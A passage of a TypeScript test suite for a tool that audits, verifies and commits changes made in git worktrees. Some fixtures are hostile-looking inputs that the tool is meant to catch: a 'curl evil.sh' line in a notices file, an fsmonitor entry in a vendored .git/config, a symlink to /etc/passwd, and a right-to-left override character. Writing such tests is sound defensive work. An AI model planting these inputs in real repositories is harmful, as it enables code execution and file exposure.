    writeFiles(worktree, { ...IMPLEMENTATION, "THIRD_PARTY_NOTICES.md": "Run curl evil.sh\n" });
    await reportSession(config, id, true);
    expect(await auditRules(id)).toContain("scope.unplanned_file");
  });
});

describe("replacing a plan", () => {
  it("drops what the old plan installed", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, IMPLEMENTATION);
    await verifySession(config, id, {});
    expect(existsSync(path.join(config.home, "runs", id))).toBe(true);
    await recordPlan(config, id, planWith());
    expect(existsSync(path.join(config.home, "runs", id))).toBe(false);
  });

  it("does not allow tracing again, which could drop a license problem", async () => {
    const { id } = await workspaceFor();
    await recordPlan(config, id, planWith());
    await expect(traceSession(config, id, { seeds: ["src/a.js"] })).rejects.toMatchObject({
      code: "already_approved",
    });
  });

  it("counts approved replacements, not drafts", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, IMPLEMENTATION);
    await recordPlan(config, id, planWith());
    const planned = await recordPlan(config, id, planWith({ rollback: "Revert." }));
    await approvePlan(config, id, {
      plan_hash: planned.planHash!,
      user_confirmation: "yes",
      via: "agent_attested",
    });
    const { result } = await reportSession(config, id, true);
    expect(result.markdown).toContain("replaced 1 time(s)");
  });
});

describe("accepted findings on folders", () => {
  it("does not carry over when what is inside changes", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, { ...IMPLEMENTATION, "vendor/lib/.git/config": "[core]\n" });
    const first = await auditSession(config, id);
    const pending = first.session
      .audit!.findings.filter((item) => item.severity === "high")
      .map((item) => ({ finding_id: item.id, reason: "accepted by the user" }));
    expect((await auditSession(config, id, pending)).blocking).toBe(0);
    writeFiles(worktree, { "vendor/lib/.git/config": "[core]\nfsmonitor = ./x\n" });
    expect((await auditSession(config, id)).blocking).toBeGreaterThan(0);
  });
});

describe("telling old failures from new ones", () => {
  const FAILING_TARGET = {
    ...TARGET,
    "tests/old.test.js": `require('node:test').test('old failure', () => { throw new Error('old'); });\n`,
  };

  it("reports a failure the base commit already has, without blocking on it", async () => {
    const { id, worktree } = await workspaceFor(planWith(), FAILING_TARGET);
    writeFiles(worktree, IMPLEMENTATION);
    await auditSession(config, id);
    const first = await verifySession(config, id, { continueOnFailure: true });
    expect(first.results.find((item) => item.name === "unit")?.status).toBe("failed");

    const baseline = await baselineSession(config, id);
    expect(baseline.baseline!.commands.find((item) => item.name === "unit")?.failures).toEqual([
      "old failure",
    ]);
    const second = await verifySession(config, id, { continueOnFailure: true });
    expect(second.results.find((item) => item.name === "unit")?.status).toBe("known_failures");

    const evidence = (log_contains: string) => ({
      acceptance_criterion: "AC-1",
      status: "pass" as const,
      kind: "test" as const,
      command_name: "unit",
      log_contains,
      detail: "unit test",
    });
    await expect(recordEvidence(config, id, [evidence("old failure")])).rejects.toMatchObject({
      code: "evidence_invalid",
    });
    await recordEvidence(config, id, [evidence("value is one")]);
    await recordEvidence(config, id, [
      { acceptance_criterion: "AC-2", status: "manual_required", kind: "manual_note", detail: "person" },
      { acceptance_criterion: "AC-3", status: "manual_required", kind: "manual_note", detail: "person" },
    ]);
    const { result } = await reportSession(config, id, false);
    expect(result.status).toBe("complete");
    expect(result.markdown).toContain("`unit`: old failure");
  });

  it("still fails a test this work broke", async () => {
    const { id, worktree } = await workspaceFor(planWith(), FAILING_TARGET);
    writeFiles(worktree, IMPLEMENTATION);
    await baselineSession(config, id);
    writeFiles(worktree, {
      "tests/a.test.js": `require('node:test').test('new failure', () => { throw new Error('new'); });\n`,
    });
    const { results } = await verifySession(config, id, { continueOnFailure: true });
    expect(results.find((item) => item.name === "unit")?.status).toBe("failed");
  });

  it("reads failing test names from common runners", () => {
    expect(failingTests("--- FAIL: TestOne (0.00s)\nFAIL\nFAIL\texample.com/x\t0.1s\n")).toEqual(["TestOne"]);
    expect(failingTests("FAILED tests/a.py::test_two - assert 1\n")).toEqual(["tests/a.py::test_two"]);
    expect(failingTests(" FAIL  src/a.test.ts > group > three\n")).toEqual(["src/a.test.ts > group > three"]);
    expect(failingTests("  ✕ four (3 ms)\n   × five 12ms\n✖ six (1.2ms)\n")).toEqual(["five", "four", "six"]);
    expect(failingTests("Error: cannot compile\n")).toEqual([]);
  });

  it("counts failures that are not a single test, so they cannot pass as old ones", () => {
    expect(failingTests("FAIL\texample.com/x [build failed]\n")).toEqual(["example.com/x"]);
    expect(failingTests("ERROR tests/a.py::test_b - boom\n")).toEqual(["tests/a.py::test_b"]);
    expect(failingTests(" FAIL  src/a.test.ts [ src/a.test.ts ]\n")).toEqual(["src/a.test.ts"]);
    expect(failingTests("panic: boom\n")).toEqual(["boom"]);
    expect(failingTests("--- FAIL: TestOne (0.00s)\nFAIL\texample.com/x\t0.1s\n")).toEqual(["TestOne"]);
  });

  it("removes hidden characters from test names", () => {
    const [name] = failingTests(`--- FAIL: Test\u202Eevil\n`);
    expect(name).not.toContain("\u202E");
  });

  it("accepts a build that ends the same way as on the base commit, and no other", async () => {
    const failingBuild = { name: "build", command: "node build.js", kind: "build" };
    const plan = planWith({
      verification: { commands: [...planWith().verification.commands, failingBuild] },
    });
    const script = (text: string) => `console.log('run ' + Date.now()); throw new Error('${text}');\n`;
    const { id, worktree, workspace } = await workspaceFor(plan, {
      ...TARGET,
      "build.js": script("no api key"),
    });
    writeFiles(worktree, IMPLEMENTATION);
    await baselineSession(config, id);
    const statusOf = async () =>
      (await verifySession(config, id, { continueOnFailure: true })).results.find(
        (item) => item.name === "build",
      )?.status;
    expect(await statusOf()).toBe("known_failures");
    expect(workspace.baseSha).toBeTruthy();

    writeFiles(worktree, { "build.js": script("this work broke something") });
    expect(await statusOf()).toBe("failed");
  });

  it("counts a Rust run with tests in some targets and none in others", async () => {
    const output = (lines: string[]) => `console.log(${JSON.stringify(lines.join("\n"))})`;
    const run = async (lines: string[]) => {
      const command = { name: "unit", command: "node run.js", kind: "test" };
      const { id, worktree } = await workspaceFor(planWith({ verification: { commands: [command] } }));
      writeFiles(worktree, { ...IMPLEMENTATION, "run.js": `${output(lines)}\n` });
      await auditSession(config, id).catch(() => undefined);
      return (await verifySession(config, id, {})).results[0]?.status;
    };
    const plan = [
      "running 0 tests",
      "test result: ok. 0 passed",
      "running 6 tests",
      "test result: ok. 6 passed",
    ];
    expect(await run(plan)).toBe("passed");
    expect(await run(["running 0 tests", "test result: ok. 0 passed"])).toBe("no_tests_ran");
  });

  it("notices a new error anywhere in a failing command's output", () => {
    const lines = Array.from({ length: 40 }, (_, index) => `src/a${index}.ts: error`);
    const before = failureSignature(`$ tsc\n${lines.join("\n")}\n`, "/run");
    const after = failureSignature(`$ tsc\nsrc/new.ts: error\n${lines.join("\n")}\n`, "/run");
    expect(after).not.toBe(before);
    expect(failureSignature("took 12ms at /run/a\n", "/run")).toBe(
      failureSignature("took 99ms at /other/a\n", "/other"),
    );
  });

  it("sees a test folder as narrowing, and a whole-suite run as not", () => {
    const narrowed = (command: string) =>
      narrowedChecks({ verification: { commands: [{ command, kind: "test" }] } } as TransplantPlan);
    expect(narrowed("cd backend && ../.venv/bin/pytest -v tests/core")).toHaveLength(1);
    expect(narrowed("go test ./common/")).toHaveLength(1);
    expect(narrowed("go test -v ./...")).toEqual([]);
    expect(narrowed("npx vitest run --reporter=verbose")).toEqual([]);
    expect(narrowed("python -m pytest -q")).toEqual([]);
    expect(narrowed("cd backend && uv run pytest -v tests/")).toEqual([]);
    expect(narrowed("pytest -c pyproject.toml")).toEqual([]);
    expect(narrowed("pytest tests/core && echo done")).toHaveLength(1);
    expect(narrowed("pytest backend/tests")).toEqual([]);
    expect(narrowed("npx playwright test e2e/one.spec.ts")).toHaveLength(1);
    expect(narrowed("mvnw.cmd -q -B test -Dtest=RequestLoggingFilterTests")).toHaveLength(1);
    expect(narrowed("./gradlew test --tests Foo")).toHaveLength(1);
    expect(narrowed("python manage.py test styleguide.core.tests -v 2")).toHaveLength(1);
    expect(narrowed("python manage.py test")).toEqual([]);
    expect(narrowed("pnpm test -- src/a.test.ts")).toHaveLength(1);
    expect(narrowed("npm test")).toEqual([]);
  });

  it("says when a UI change has no real browser check", () => {
    const plan = (kinds: string[]) =>
      ({
        files: [{ path: "src/Palette.tsx" }],
        verification: { commands: kinds.map((kind) => ({ kind })) },
      }) as TransplantPlan;
    expect(needsBrowserCheck(plan(["test"]))).toBe(true);
    expect(needsBrowserCheck(plan(["test", "e2e"]))).toBe(false);
    const specsOnly = {
      ...plan(["test"]),
      files: [{ path: "src/A.spec.tsx" }, { path: "src/A.stories.tsx" }],
    };
    expect(needsBrowserCheck(specsOnly as TransplantPlan)).toBe(false);
  });

  it("needs a browser check or a stated reason for a plan that changes UI files", async () => {
    const ui = planWith({
      files: [
        ...planWith().files,
        { path: "src/Palette.tsx", action: "create", purpose: "UI", acceptance_criteria: ["AC-1"] },
      ],
    });
    await expect(workspaceFor(ui)).rejects.toMatchObject({ code: "invalid_plan" });
    const waived = {
      ...ui,
      verification: { ...ui.verification, no_browser_check_reason: "The app needs a paid licence server." },
    };
    const { id } = await workspaceFor(waived);
    const session = await loadSession(config, id);
    expect(approvalSummary(session)).toContain("The app needs a paid licence server.");
  });

  it("calls out a test command that runs only part of the suite", async () => {
    const plan = planWith({
      verification: { commands: [{ name: "unit", command: "go test -run Gzip ./...", kind: "test" }] },
    });
    const { id } = await workspaceFor(plan);
    const session = await loadSession(config, id);
    expect(approvalSummary(session)).toContain("Runs only part of the test suite: go test -run Gzip ./...");
  });
});

describe("cancelling verification", () => {
  it("stops the running command and records nothing", async () => {
    const stuck = { name: "stuck", command: `node -e "setTimeout(()=>{},60000)"`, kind: "test" };
    const { id, worktree } = await workspaceFor(planWith({ verification: { commands: [stuck] } }));
    writeFiles(worktree, IMPLEMENTATION);
    const controller = new AbortController();
    setTimeout(() => controller.abort(), 500);
    const started = Date.now();
    await expect(verifySession(config, id, { signal: controller.signal })).rejects.toMatchObject({
      code: "cancelled",
    });
    expect(Date.now() - started).toBeLessThan(15_000);
    expect((await loadSession(config, id)).verifications).toEqual([]);
  });
});

describe("quick verification", () => {
  it("does not count, and the next full run starts without its packages", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, IMPLEMENTATION);
    const quick = await verifySession(config, id, { provisional: true });
    expect(quick.results.length).toBeGreaterThan(0);
    expect((await loadSession(config, id)).verifications).toEqual([]);

    const run = path.join(config.home, "runs", id, "work");
    writeFiles(run, { "node_modules/planted/index.js": "module.exports = 1;\n" });
    await verifySession(config, id, { provisional: true });
    expect(existsSync(path.join(run, "node_modules/planted/index.js"))).toBe(true);
    await verifySession(config, id, {});
    expect(existsSync(path.join(run, "node_modules/planted/index.js"))).toBe(false);
  });
});

describe("verification services", () => {
  const service = { name: "db", image: "postgres:16-alpine", ready_command: "pg_isready" };
  const unit = { name: "unit", command: "node --test", kind: "test" };

  it("need a container for the commands too", async () => {
    await expect(
      workspaceFor(planWith({ verification: { commands: [unit], services: [service] } })),
    ).rejects.toMatchObject({ code: "invalid_plan" });
  });

  it("can be named in connection settings when the plan is recorded", async () => {
    const database = {
      name: "unit",
      command: "node --test",
      kind: "test",
      env: { DATABASE_URL: "postgres://u:p@db:5432/x" },
    };
    const { id } = await workspaceFor(
      planWith({ verification: { docker_image: "node:24", commands: [database], services: [service] } }),
    );
    expect((await loadSession(config, id)).plan!.verification.services).toHaveLength(1);
  });

  it("count as local hosts, and nothing else does", () => {
    const command = {
      name: "unit",
      command: "x",
      kind: "test",
      env: { DATABASE_URL: "postgres://u:p@db:5432/x" },
    };
    const parsed = { ...command, timeout_s: 60 } as Parameters<typeof assertLocalEnv>[0];
    expect(() => assertLocalEnv(parsed, ["db"])).not.toThrow();
    expect(() => assertLocalEnv(parsed)).toThrow(/points at db/);
  });
});

describe("after the merge", () => {
  async function committed(options = { includeRecords: true }) {
    const context = await workspaceFor();
    writeFiles(context.worktree, IMPLEMENTATION);
    await auditSession(config, context.id);
    await verifySession(config, context.id, {});
    await recordEvidence(config, context.id, ALL_EVIDENCE);
    await reportSession(config, context.id, false);
    const session = await commitSession(config, context.id, "Add A", options);
    return { ...context, commit: session.workspace!.commit! };
  }

  it("removes the worktree and branch once merged, and refuses before that", async () => {
    const { id, worktree, repo, commit, workspace } = await committed();
    await expect(cleanupSession(config, id, false)).rejects.toMatchObject({ code: "not_merged" });
    expect(existsSync(worktree)).toBe(true);
    gitIn(repo, "merge", "-q", commit);
    await cleanupSession(config, id, false);
    expect(existsSync(worktree)).toBe(false);
    expect(gitIn(repo, "branch", "--list", workspace.branch).trim()).toBe("");
    expect(readFileSync(path.join(repo, "src/a.js"), "utf8")).toBe(IMPLEMENTATION["src/a.js"]);
  });

  it("also recognizes a branch merged by hand, but not an empty one", async () => {
    const empty = await workspaceFor();
    await expect(cleanupSession(config, empty.id, false)).rejects.toMatchObject({ code: "not_merged" });

    const { id, repo, worktree, workspace } = await workspaceFor();
    writeFiles(worktree, IMPLEMENTATION);
    gitIn(worktree, "add", ".");
    gitIn(worktree, "commit", "-qm", "work");
    gitIn(repo, "merge", "-q", workspace.branch);
    await cleanupSession(config, id, false);
    expect(existsSync(worktree)).toBe(false);
  });

  it("can leave the report and provenance out of the commit", async () => {
    const { repo, commit } = await committed({ includeRecords: false });
    expect(gitIn(repo, "ls-tree", "-r", "--name-only", commit)).not.toContain(".transplant");
  });
});

describe("the commit holds exactly what was reviewed", () => {
  const names = ["src/a,b c.js", "src/한글.js", "src/-dash.js", ".env.example"];

  async function reportedWith(files: Record<string, string>) {
    const plan = planWith({
      files: [
        ...planWith().files,
        ...Object.keys(files).map((path) => ({
          path,
          action: "create",
          purpose: "File",
          acceptance_criteria: ["AC-1"],
        })),
      ],
    });
    const context = await workspaceFor(plan);
    writeFiles(context.worktree, { ...IMPLEMENTATION, ...files });
    await auditSession(config, context.id);
    await verifySession(config, context.id, {});
    await recordEvidence(config, context.id, ALL_EVIDENCE);
    const { result } = await reportSession(config, context.id, false);
    expect(result.status).toBe("complete");
    return context;
  }

  it("works from folders with Korean names and spaces", async () => {
    const home = loadConfig({ RT_HOME: tempDir("홈 폴더 ") });
    const { id, repo, worktree } = await workspaceFor(planWith(), TARGET, home, "내 프로젝트 ");
    writeFiles(worktree, IMPLEMENTATION);
    await auditSession(home, id);
    await verifySession(home, id, {});
    await recordEvidence(home, id, ALL_EVIDENCE);
    const { result } = await reportSession(home, id, false);
    expect(result.status).toBe("complete");
    const commit = (await commitSession(home, id, "Add A")).workspace!.commit!;
    gitIn(repo, "merge", "-q", commit);
    expect(readFileSync(path.join(repo, "src/a.js"), "utf8")).toBe(IMPLEMENTATION["src/a.js"]);
  });

  it("commits LF when git would, and for files that have LF in the base", async () => {
    const repo = createRepo({ ...TARGET, "plain.txt": "one\ntwo\n", "windows.txt": "one\r\ntwo\r\n" });
    const workspace = await createWorkspace(repo, "feature-cccccc", gitIn(repo, "rev-parse", "HEAD").trim());
    writeFiles(workspace.path, {
      "plain.txt": "one\r\nthree\r\n",
      "windows.txt": "one\r\nfour\r\n",
      "new.txt": "a\r\nb\r\n",
    });
    const bytes = (rel: string, commit: string) =>
      execFileSync("git", ["show", `${commit}:${rel}`], { cwd: repo }).toString();
    const kept = await commitReviewed(repo, workspace, await reviewTree(workspace), "Add", {
      includeRecords: true,
    });
    expect(bytes("plain.txt", kept)).toBe("one\nthree\n");
    expect(bytes("windows.txt", kept)).toBe("one\r\nfour\r\n");
    expect(bytes("new.txt", kept)).toBe("a\r\nb\r\n");

    const other = createRepo(TARGET);
    gitIn(other, "config", "core.autocrlf", "true");
    const next = await createWorkspace(other, "feature-dddddd", gitIn(other, "rev-parse", "HEAD").trim());
    writeFiles(next.path, { "new.txt": "a\r\nb\r\n" });
    const converted = await commitReviewed(other, next, await reviewTree(next), "Add", {
      includeRecords: true,
    });
    expect(execFileSync("git", ["show", `${converted}:new.txt`], { cwd: other }).toString()).toBe("a\nb\n");
  });

  it("keeps odd file names and exact bytes, line endings included", async () => {
    const files = Object.fromEntries(names.map((name) => [name, `# ${name}\r\nA=1\n`]));
    const { id, repo } = await reportedWith(files);
    const commit = (await commitSession(config, id, "Add A")).workspace!.commit!;
    for (const [name, text] of Object.entries(files)) {
      expect(execFileSync("git", ["show", `${commit}:${name}`], { cwd: repo }).toString()).toBe(text);
    }
  });

  it("adds nothing beyond the reviewed files and the tool's own records", async () => {
    const { id, repo, workspace } = await reportedWith({});
    const commit = (await commitSession(config, id, "Add A")).workspace!.commit!;
    const added = gitIn(repo, "diff", "--name-only", "-z", workspace.baseSha, commit)
      .split("\0")
      .filter(Boolean);
    const outside = added.filter(
      (name) => !name.startsWith(".transplant/") && name !== "THIRD_PARTY_NOTICES.md",
    );
    expect(outside.sort()).toEqual(["src/a.js", "tests/a.test.js"]);
  });

  it("does not make a regular file into a symlink because the base had one", async () => {
    const repo = createRepo(TARGET);
    const blob = gitIn(repo, "rev-parse", "HEAD:src/app.js").trim();
    gitIn(repo, "update-index", "--add", "--cacheinfo", `120000,${blob},link`);
    gitIn(repo, "commit", "-qm", "link");
    const workspace = await createWorkspace(repo, "feature-aaaaaa", gitIn(repo, "rev-parse", "HEAD").trim());
    await rm(path.join(workspace.path, "link"), { force: true });
    writeFiles(workspace.path, { link: "/etc/passwd" });
    const review = await reviewTree(workspace);
    const commit = await commitReviewed(repo, workspace, review, "Add", { includeRecords: true });
    expect(gitIn(repo, "ls-tree", commit, "link")).toMatch(/^100644 /);
  });

  it("replaces a file with a folder of the same name", async () => {
    const repo = createRepo({ ...TARGET, lib: "old\n" });
    const workspace = await createWorkspace(repo, "feature-bbbbbb", gitIn(repo, "rev-parse", "HEAD").trim());
    await rm(path.join(workspace.path, "lib"));
    writeFiles(workspace.path, { "lib/a.js": "new\n" });
    const review = await reviewTree(workspace);
    const commit = await commitReviewed(repo, workspace, review, "Add", { includeRecords: true });
    expect(gitIn(repo, "show", `${commit}:lib/a.js`)).toBe("new\n");
  });

  it("will not write a new report once committed, which would leave the hash behind", async () => {
    const { id } = await reportedWith({});
    await commitSession(config, id, "Add A");
    await expect(reportSession(config, id, false)).rejects.toMatchObject({ code: "already_committed" });
  });

  it("refuses a report file changed after the report", async () => {
    const { id, worktree } = await reportedWith({});
    writeFiles(worktree, { [`.transplant/reports/${id}.md`]: "All clear, merge it.\n" });
    await expect(commitSession(config, id, "Add A")).rejects.toMatchObject({ code: "stale_review" });
  });
});
